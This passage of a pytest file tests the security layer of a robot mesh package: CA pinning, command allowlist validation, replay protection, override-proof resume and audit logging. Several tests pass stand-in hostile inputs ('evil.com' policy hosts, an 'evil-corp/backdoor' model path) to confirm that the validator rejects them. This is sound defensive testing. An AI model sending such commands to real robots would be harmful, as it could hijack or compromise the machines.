    # through _resolve_ca_pins. Internal code references the tuple
    # directly; pin this so a future refactor can't reintroduce a
    # dead alias that CodeQL would flag again.
    assert not hasattr(provision, "_AMAZON_ROOT_CA1_SHA256"), (
        "Legacy _AMAZON_ROOT_CA1_SHA256 alias reintroduced — R8-10 reopened. Use _AMAZON_ROOT_CA1_PINS[0] directly."
    )

    # Default resolver returns at least the built-in tuple.
    monkeypatch.delenv("STRANDS_MESH_CA_PINS", raising=False)
    pins = provision._resolve_ca_pins()
    assert provision._AMAZON_ROOT_CA1_PINS[0] in pins

    # Env var augments the set.
    extra = "0123456789" * 6 + "0123"  # 64 chars
    monkeypatch.setenv("STRANDS_MESH_CA_PINS", extra)
    pins = provision._resolve_ca_pins()
    assert extra in pins
    assert provision._AMAZON_ROOT_CA1_PINS[0] in pins, "built-in must remain"

    # Multiple comma-separated.
    extra2 = "deadbeef" * 8  # 64 chars
    monkeypatch.setenv("STRANDS_MESH_CA_PINS", f"{extra},{extra2}")
    pins = provision._resolve_ca_pins()
    assert extra in pins and extra2 in pins

    # Invalid entries are skipped with a WARNING, not silently accepted.
    monkeypatch.setenv("STRANDS_MESH_CA_PINS", "not-hex," + extra)
    pins = provision._resolve_ca_pins()
    assert "not-hex" not in pins
    assert extra in pins, "valid entries alongside invalid ones must still parse"

    # Uppercase hex is normalised to lowercase before validation; SHA-256
    # hexdigest() emits lowercase, so an uppercase env value would never
    # match a real CA hash. Reject as malformed (pin regex is lowercase).
    monkeypatch.setenv("STRANDS_MESH_CA_PINS", "DEADBEEF" * 8)
    pins = provision._resolve_ca_pins()
    # Resolver normalises to lowercase before regex check, so uppercase
    # passes through as "deadbeef..." and is added.
    assert "deadbeef" * 8 in pins, "uppercase hex must be normalised to lowercase"


def test_r7_3_hash_matches_pin_consults_full_set(monkeypatch):
    """R7-3: ``_hash_matches_pin`` returns True for any accepted pin,
    not just the first."""
    import hashlib

    from strands_robots.mesh.iot import provision

    # Plant a known body whose SHA-256 we control.
    body = b"-----BEGIN ROTATED CA-----\nfuture\n"
    digest = hashlib.sha256(body).hexdigest()

    # Without env var: not a built-in pin → False.
    monkeypatch.delenv("STRANDS_MESH_CA_PINS", raising=False)
    assert not provision._hash_matches_pin(body)

    # With the digest in the env var: True.
    monkeypatch.setenv("STRANDS_MESH_CA_PINS", digest)
    assert provision._hash_matches_pin(body), (
        "Pin from STRANDS_MESH_CA_PINS not honoured by _hash_matches_pin — R7-3 reopened."
    )


@pytest.mark.parametrize(
    "field",
    ["policy_provider", "policy_type", "model_path", "pretrained_name_or_path", "server_address"],
)
def test_r7_4_validate_command_rejects_explicit_none(field, monkeypatch):
    """R7-4: every per-field gate in ``validate_command`` must reject
    an explicit-None value. Pre-fix ``cmd.get(k, default)`` returned
    None when the key was present with None value, ``if value`` short-
    circuited every gate, and the explicit-None survived in
    ``out = dict(cmd)`` to be forwarded into the executor.

    Fix pattern: distinguish key-absent (apply default) from
    key-present (must be a non-empty string in the allowlist).
    """
    monkeypatch.delenv("STRANDS_MESH_HF_REPO_ALLOW", raising=False)
    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
    monkeypatch.delenv("STRANDS_MESH_POLICY_TYPE_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base = {"action": "execute", "instruction": "x", "policy_host": "localhost"}
    attack = dict(base, **{field: None})
    with pytest.raises(sec.ValidationError):
        sec.validate_command(attack)


def test_r7_4_validate_command_default_policy_provider_preserved():
    """R7-4: when ``policy_provider`` is absent, ``validate_command``
    still applies the default ``"mock"``. Fix must not break the
    back-compat path.
    """
    from strands_robots.mesh import security as sec

    out = sec.validate_command(
        {
            "action": "execute",
            "instruction": "x",
            "policy_host": "localhost",
        }
    )
    assert out["policy_provider"] == "mock"
    # Other optional fields stay absent when not provided.
    for k in ("policy_type", "model_path", "pretrained_name_or_path", "server_address"):
        assert k not in out, f"validate_command added {k!r} without it being in cmd"


def test_r7_5_audit_tool_action_logs_at_debug_on_failure(caplog, monkeypatch):
    """R7-5: ``_audit_tool_action`` no longer silently swallows
    exceptions. A broken audit path must leave a DEBUG breadcrumb so
    operators investigating "why don't I see my LLM tool actions in
    the audit log?" find a trace.
    """
    import logging

    import strands_robots.tools.robot_mesh as rmt

    # Monkeypatch the audit import so the call inside _audit_tool_action raises.
    def boom(*args, **kwargs):
        raise OSError("disk full")

    monkeypatch.setattr("strands_robots.mesh.audit.log_safety_event", boom)

    with caplog.at_level(logging.DEBUG, logger="strands_robots.tools.robot_mesh"):
        rmt._audit_tool_action("emergency_stop", "*", False, "test")

    # Expect a DEBUG-level message about the audit log being unavailable.
    matched = [
        rec
        for rec in caplog.records
        if rec.name == "strands_robots.tools.robot_mesh" and "audit log unavailable" in rec.getMessage()
    ]
    assert matched, (
        "No DEBUG breadcrumb on audit failure — R7-5 reopened. Pattern: except Exception as exc: logger.debug(...)."
    )


def test_r7_5_audit_tool_action_no_bare_pass():
    """R7-5: pin the structural fix — _audit_tool_action must not
    contain `except Exception:` followed only by `pass`."""
    import inspect

    import strands_robots.tools.robot_mesh as rmt

    src = inspect.getsource(rmt._audit_tool_action)
    # Must reference the logger (debug call).
    assert "logger.debug" in src, "_audit_tool_action no longer logs at DEBUG on failure — R7-5 reopened."
    # Specifically: must NOT have a bare "except Exception:" followed by "pass".
    lines = src.splitlines()
    for i, line in enumerate(lines):
        stripped = line.strip()
        if stripped.startswith("except") and "Exception" in stripped:
            # Look at the next non-empty, non-comment lines.
            for j in range(i + 1, min(i + 4, len(lines))):
                nxt = lines[j].strip()
                if not nxt or nxt.startswith("#"):
                    continue
                assert nxt != "pass", (
                    f"_audit_tool_action has `except Exception: pass` at line {i + 1} — R7-5 reopened."
                )
                break


# ───────────────────────────────────────────────────────────────────────────
# Round 8 — yinsong1986 final-pass review feedback
# ───────────────────────────────────────────────────────────────────────────


def test_r8_1_remote_estop_engages_audit_record(tmp_path, monkeypatch):
    """R8-1: receiver-side ``_on_safety_estop`` writes an audit record
    when entering lockout. Pre-fix the receiver only logged at
    CRITICAL — verify_audit_integrity walkers couldn't see which peers
    actually engaged their lockout in response to a fleet-wide estop.
    """
    import json
    from unittest.mock import MagicMock

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "r8-1-psk")
    from strands_robots.mesh import audit
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None
    sec.clear_replay_cache()

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    # Stub _put_signed (the receiver doesn't have a real transport).
    receiver._put_signed = MagicMock()
    receiver._running = True  # publish_safety_event guards on this

    estop = sec.sign_envelope({"peer_id": "r-issuer", "t": 1.0, "lockout_engaged": True})
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(estop).encode()

    receiver._on_safety_estop(sample)

    records = audit.read_audit_log()
    assert any(r["event"] == "remote_estop_engaged" for r in records), (
        f"_on_safety_estop did not write an audit record — R8-1 reopened. records: {[r['event'] for r in records]}"
    )


def test_r8_1_remote_resume_writes_audit_record(tmp_path, monkeypatch):
    """R8-1: receiver-side ``_on_safety_resume`` writes an audit record
    when clearing lockout. Mirrors the estop side — both ends of the
    lockout window must be walkable post-incident.
    """
    import hmac as _hmac
    import json
    from unittest.mock import MagicMock

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "r8-1-psk")
    monkeypatch.setenv("STRANDS_MESH_OVERRIDE_CODE", "shared-code")
    from strands_robots.mesh import audit
    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None
    sec.clear_replay_cache()

    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._put_signed = MagicMock()
    receiver._running = True
    receiver._estop_lockout.set()

    proof_nonce = "deadbeef" * 4
    proof = _hmac.new(b"shared-code", proof_nonce.encode(), "sha256").hexdigest()
    resume = sec.sign_envelope(
        {
            "peer_id": "r-issuer",
            "t": 2.0,
            "lockout_elapsed_s": 0.5,
            "proof_nonce": proof_nonce,
            "override_proof": proof,
        }
    )
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(resume).encode()

    receiver._on_safety_resume(sample)

    records = audit.read_audit_log()
    assert any(r["event"] == "remote_resume_applied" for r in records), (
        f"_on_safety_resume did not write an audit record — R8-1 reopened. records: {[r['event'] for r in records]}"
    )


def test_r8_2_legacy_bare_dict_replay_blocked(monkeypatch):
    """R8-2: legacy bare-dict payloads (no ``v`` / ``payload`` keys)
    previously bypassed BOTH the freshness window and the nonce-cache
    replay check in permissive mode. An attacker who captured any
    legacy cmd could replay it indefinitely. Fixed by synthesizing a
    content-fingerprint nonce before the early-return.
    """
    from strands_robots.mesh import security as sec

    sec.clear_replay_cache()
    legacy = {
        "sender_id": "alice",
        "turn_id": "t-1",
        "command": {"action": "execute", "instruction": "go"},
    }

    # First delivery passes.
    r1 = sec.verify_envelope(legacy, scope="bob")
    assert r1 is not None

    # Second delivery (replay) MUST be rejected.
    with pytest.raises(sec.AuthenticationError, match="replay detected for legacy"):
        sec.verify_envelope(legacy, scope="bob")


def test_r8_2_distinct_legacy_dicts_both_pass():
    """R8-2: distinct legacy contents must still pass — the replay
    fingerprint is content-keyed, not sender-keyed."""
    from strands_robots.mesh import security as sec

    sec.clear_replay_cache()
    sec.verify_envelope(
        {"sender_id": "alice", "command": {"action": "status"}},
        scope="bob",
    )
    sec.verify_envelope(
        {"sender_id": "alice", "command": {"action": "stop"}},
        scope="bob",
    )


def test_r8_3_authorization_error_class_is_gone():
    """R8-3 (also covered by test_r4_8_supersedes_authorization_error_deleted_per_r8_3
    above): explicit duplicate so a future grep on R8 lists every fix
    here."""
    from strands_robots.mesh import security as sec

    assert not hasattr(sec, "AuthorizationError")


def test_r8_4_rotation_reaches_max_files(tmp_path, monkeypatch):
    """R8-4: audit log rotation cascade was off by one — kept
    ``max_files - 1`` rotated copies, not ``max_files``. The README
    documents the env var as "Maximum number of rotated audit log
    copies kept" so an operator setting MAX_FILES=5 expected 5 rotated
    copies. Pre-fix only got 4.
    """
    import glob

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_AUDIT_PSK", "r8-4-psk")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_MAX_BYTES", "2048")
    monkeypatch.setenv("STRANDS_MESH_AUDIT_MAX_FILES", "5")

    from strands_robots.mesh import audit

    audit._SEQ_COUNTERS.clear()
    audit._AUDIT_STATE.seq_loaded = False
    audit._AUDIT_STATE.psk_was_present = None

    # Force enough rotations.
    for i in range(2000):
        audit.log_safety_event("flood", "p", {"i": i, "pad": "x" * 200})

    files = sorted(glob.glob(str(tmp_path / "mesh_audit.jsonl*")))
    files = [f for f in files if not f.endswith(".seq.json") and not f.endswith(".lock")]
    suffixes = sorted([f.rsplit("mesh_audit.jsonl", 1)[1] for f in files])

    # Expect: active log ('') plus .1 .. .5
    assert ".5" in suffixes, (
        f"Rotation only reached {sorted(suffixes)} — R8-4 reopened. "
        f"With max_files=5, expected '.1' through '.5' to all exist."
    )
    assert len(files) == 6, f"Expected 6 files (active + .1..5), got {len(files)}: {suffixes}"


def test_r8_5_remote_resume_requires_override_proof(tmp_path, monkeypatch):
    """R8-5: ``_on_safety_resume`` rejects a signed-but-no-proof resume.

    Before R8-5, any peer with the PSK could fan-out a resume — the
    override code only protected the local issuer's gate. Now the
    issuer binds HMAC(override_code, proof_nonce) into the resume
    payload and the receiver re-verifies with its OWN local code.
    """
    import json
    from unittest.mock import MagicMock

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "r8-5-psk")
    monkeypatch.setenv("STRANDS_MESH_OVERRIDE_CODE", "fleet-shared-override")

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    sec.clear_replay_cache()
    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._put_signed = MagicMock()
    receiver._estop_lockout.set()

    # Resume WITHOUT proof — must be rejected (the lockout stays engaged).
    bad = sec.sign_envelope({"peer_id": "issuer", "t": 1.0})
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(bad).encode()
    receiver._on_safety_resume(sample)
    assert receiver._estop_lockout.is_set(), (
        "Resume without override_proof was accepted — R8-5 reopened. "
        "PSK alone must not be sufficient for fleet-wide resume."
    )


def test_r8_5_remote_resume_rejects_wrong_override(tmp_path, monkeypatch):
    """R8-5: a resume whose override_proof was computed with a
    DIFFERENT code than the receiver has must be rejected (constant-
    time-compared)."""
    import hmac as _hmac
    import json
    from unittest.mock import MagicMock

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "r8-5-psk")
    monkeypatch.setenv("STRANDS_MESH_OVERRIDE_CODE", "receiver-code")

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    sec.clear_replay_cache()
    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._put_signed = MagicMock()
    receiver._estop_lockout.set()

    # Issuer used a different override code.
    proof_nonce = "deadbeef" * 4
    proof = _hmac.new(b"different-issuer-code", proof_nonce.encode(), "sha256").hexdigest()
    resume = sec.sign_envelope(
        {
            "peer_id": "issuer",
            "t": 1.0,
            "proof_nonce": proof_nonce,
            "override_proof": proof,
        }
    )
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(resume).encode()
    receiver._on_safety_resume(sample)
    assert receiver._estop_lockout.is_set(), "Resume with wrong override_proof was accepted — R8-5 reopened."


def test_r8_5_receiver_without_override_code_fails_closed(tmp_path, monkeypatch):
    """R8-5: a receiver without ``STRANDS_MESH_OVERRIDE_CODE`` configured
    fails closed and refuses every remote resume — even one with a
    correctly-computed proof. Operators must distribute the override
    code to every peer for fleet-wide remote resume to work.
    """
    import hmac as _hmac
    import json
    from unittest.mock import MagicMock

    monkeypatch.setenv("STRANDS_MESH_AUDIT_DIR", str(tmp_path))
    monkeypatch.setenv("STRANDS_MESH_PSK", "r8-5-psk")
    monkeypatch.delenv("STRANDS_MESH_OVERRIDE_CODE", raising=False)

    from strands_robots.mesh import security as sec
    from strands_robots.mesh.core import Mesh

    sec.clear_replay_cache()
    receiver = Mesh(MagicMock(), peer_id="r-receiver")
    receiver._put_signed = MagicMock()
    receiver._estop_lockout.set()

    proof_nonce = "deadbeef" * 4
    proof = _hmac.new(b"some-code", proof_nonce.encode(), "sha256").hexdigest()
    resume = sec.sign_envelope({"peer_id": "issuer", "t": 1.0, "proof_nonce": proof_nonce, "override_proof": proof})
    sample = MagicMock()
    sample.payload.to_bytes.return_value = json.dumps(resume).encode()
    receiver._on_safety_resume(sample)
    assert receiver._estop_lockout.is_set(), (
        "Receiver without OVERRIDE_CODE accepted a remote resume — R8-5 fail-closed reopened."
    )


def test_r8_6_mesh_send_validates_client_side(monkeypatch):
    """R8-6: programmatic ``Mesh.send`` rejects off-allowlist payloads
    client-side, not just at the receiver. The PR description claimed
    client-side AND server-side validation; this closes the gap.
    """
    monkeypatch.delenv("STRANDS_MESH_HF_REPO_ALLOW", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="me")
    m._put_signed = MagicMock()
    m._running = True

    # Off-allowlist HF org should be rejected client-side.
    out = m.send(
        "peer-b",
        {
            "action": "execute",
            "instruction": "x",
            "policy_host": "localhost",
            "pretrained_name_or_path": "evil-corp/backdoor",
        },
    )
    assert out["status"] == "error"
    assert "validation" in out["error"]
    # Crucially: _put_signed was NEVER called (the bad cmd never hit the wire).
    m._put_signed.assert_not_called()


def test_r8_6_mesh_broadcast_validates_client_side(monkeypatch):
    """R8-6: same for ``Mesh.broadcast`` — bad cmd never reaches the
    wire."""
    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
    from unittest.mock import MagicMock

    from strands_robots.mesh.core import Mesh

    m = Mesh(MagicMock(), peer_id="me")
    m._put_signed = MagicMock()
    m._running = True

    out = m.broadcast(
        {
            "action": "execute",
            "instruction": "x",
            "policy_host": "evil.example.com",  # off-allowlist
        }
    )
    # broadcast returns list[dict]; on validation rejection, returns [].
    assert out == []
    m._put_signed.assert_not_called()


def test_r8_7_broadcast_validates_before_hitl_interrupt(monkeypatch):
    """R8-7: for ``broadcast``, ``robot_mesh`` parses + validates the
    JSON command BEFORE raising the HITL interrupt. Pre-fix the
    operator could approve a malformed command that the validator then
    rejected — burning an audit ``operator approved`` record AND a
    rate-limit slot for an action that never ran.
    """
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)

    # Build a tool_context whose interrupt() raises if called — proves
    # the interrupt was NOT reached.
    ctx = MagicMock()
    ctx.interrupt.side_effect = AssertionError("Interrupt was raised before validation — R8-7 reopened")

    # Bad JSON should be rejected before the interrupt.
    result = fn(
        action="broadcast",
        tool_context=ctx,
        command="not valid json {{{",
    )
    assert result["status"] == "error"
    assert "valid JSON" in result["content"][0]["text"]
    ctx.interrupt.assert_not_called()

    # Valid JSON but invalid policy_host: also rejected before interrupt.
    rmt._reset_rate_limits()
    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
    result = fn(
        action="broadcast",
        tool_context=ctx,
        command='{"action": "execute", "instruction": "x", "policy_host": "evil.com"}',
    )
    assert result["status"] == "error"
    assert "rejected" in result["content"][0]["text"]
    ctx.interrupt.assert_not_called()


def test_r8_7_declined_broadcast_does_not_consume_rate_slot(monkeypatch):
    """R8-7 corollary (also covered by R3-3): a broadcast that fails
    validation BEFORE the interrupt does not consume a rate-limit
    slot, since the validator rejected it before the interrupt could
    be approved.
    """
    from unittest.mock import MagicMock

    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = MagicMock()

    # Failed validation MUST NOT consume a rate slot.
    fn(action="broadcast", tool_context=ctx, command="not json")

    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("broadcast")
        assert bucket is None or len(bucket) == 0, "Rate slot consumed for a broadcast that never ran — R8-7 reopened."


def test_r8_10_amazon_root_ca1_sha256_alias_is_gone():
    """R8-10: the legacy ``_AMAZON_ROOT_CA1_SHA256`` alias was deleted
    per CodeQL #229. Internal code references ``_AMAZON_ROOT_CA1_PINS``
    directly; error messages format the full pin set via
    ``_resolve_ca_pins``.
    """
    from strands_robots.mesh.iot import provision

    assert not hasattr(provision, "_AMAZON_ROOT_CA1_SHA256"), (
        "Legacy _AMAZON_ROOT_CA1_SHA256 alias reintroduced — R8-10 / CodeQL #229 reopened."
    )
    # The tuple must still exist as the canonical pin source.
    assert provision._AMAZON_ROOT_CA1_PINS
    assert len(provision._AMAZON_ROOT_CA1_PINS[0]) == 64


# ---------------------------------------------------------------------------
# R8 polish tests (committed as amend to the round-8 commit).
#
# These pin three small unresolved findings from R4/R5/R6/R7 that the round-8
# pass didn't explicitly cover but are easy to lock in:
#
# * R5-defensive  : belt-and-suspenders BROADCAST_RESPONDER guard at the
#                   _expected_responders assignment site (in addition to
#                   the public Mesh.send entry-point guard).
# * R7-policy-lc  : policy_provider is lowercased by validate_command;
#                   pin the contract so dispatch can rely on it.
# * R5-flood      : permissive-mode nonce-cache flood eviction behaviour.
#                   The cache is bounded; this test asserts that a flood
#                   of unique nonces does not grow memory unboundedly,
#                   pinning the GC behaviour the R5 review flagged.
# ---------------------------------------------------------------------------


def test_r5_defensive_send_broadcast_responder_sentinel_rejected_at_assignment():
    """R5-defensive: even if a future refactor bypasses the public guard
    in :meth:`Mesh.send`, the assignment to ``_expected_responders[turn]``
    rejects the BROADCAST_RESPONDER sentinel and any NUL-containing target.
    Belt-and-suspenders: the public guard is the primary defence; this
    secondary guard makes the invariant explicit at the assignment site
    so reviewers of future patches see it clearly.
    """

    import strands_robots.mesh.core as core_mod

    # We instantiate Mesh-like minimal state and call the private path.
    # The simplest pin is to verify the public guard rejects, AND that
    # the inner block contains the sentinel check we added.
    src = core_mod.__file__
    with open(src) as fh:
        body = fh.read()

    # The defensive guard must exist.
    assert "R5-defensive" in body, "R5 defensive BROADCAST_RESPONDER guard at assignment site removed."
    assert "target may not equal BROADCAST_RESPONDER" in body, (
        "Defensive guard error message changed — pin updated assertion."
    )

    # The public guard at the top of send() is still present.
    assert "send: target may not contain NUL or equal the BROADCAST_RESPONDER sentinel" in body


def test_r7_policy_provider_lowercase_contract():
    """R7-policy-lc: ``validate_command`` lowercases ``policy_provider``
    so dispatch can rely on a canonical key. Pre-fix a caller passing
    ``"Lerobot"`` (mixed case) would have been forwarded as-is into the
    registry lookup; the registry is case-sensitive so this would have
    silently mis-routed. The validator now strips + lowercases.
    """
    from strands_robots.mesh import security as s

    cmd = {
        "action": "execute",
        "instruction": "go",
        "policy_provider": "  Mock  ",  # mixed case + whitespace
    }
    out = s.validate_command(cmd)
    assert out["policy_provider"] == "mock", (
        "policy_provider lowercase contract broken — dispatch may mis-route to wrong registry entry."
    )

    # Empty string after strip is treated as missing — falls back to default.
    cmd = {"action": "execute", "instruction": "go", "policy_provider": "   "}
    try:
        out = s.validate_command(cmd)
        # If accepted, must be normalized to the safe default.
        assert out.get("policy_provider") in ("mock", None) or out["policy_provider"] == "", (
            f"Whitespace-only policy_provider produced unexpected value: {out.get('policy_provider')!r}"
        )
    except s.ValidationError:
        # Also acceptable — strict rejection of empty.
        pass


def test_r5_permissive_replay_cache_flood_bounded():
    """R5-flood: a permissive-mode flood of unique nonces must be bounded
    by the cache cap (no unbounded memory growth). The GC walk is O(n)
    on a hot lock under attack — this test pins that the cap is enforced
    so memory cannot grow without bound. Documenting the residual O(n)
    GC cost is a docstring concern, not a code concern.
    """

    from strands_robots.mesh import security as s

    # Reset the cache so other tests don't interfere.
    with s._NONCE_LOCK:
        s._NONCE_CACHE.clear()

    cap = s._NONCE_CACHE_MAX
    # Flood ~1.5x the cap with unique nonces.
    flood_size = int(cap * 1.5)
    now = 1_000_000.0
    for i in range(flood_size):
        s._record_nonce(f"flood-{i:08x}-pad-pad-pad", now + i * 0.001, scope="flood-test")

    with s._NONCE_LOCK:
        size = len(s._NONCE_CACHE)

    # After GC, cache size MUST be at or below the cap.
    assert size <= cap, (
        f"Permissive-mode nonce cache grew unbounded: {size} entries > cap {cap}. "
        "GC eviction at _record_nonce is broken — DoS surface reopened."
    )
    # And it should not have collapsed to empty (eviction drops only ~20%).
    assert size > cap // 2, (
        f"Permissive-mode nonce cache over-evicted: {size} entries < cap/2. "
        "GC drops too aggressively — false replay rejections likely."
    )

    # Cleanup so subsequent tests start fresh.
    with s._NONCE_LOCK:
        s._NONCE_CACHE.clear()
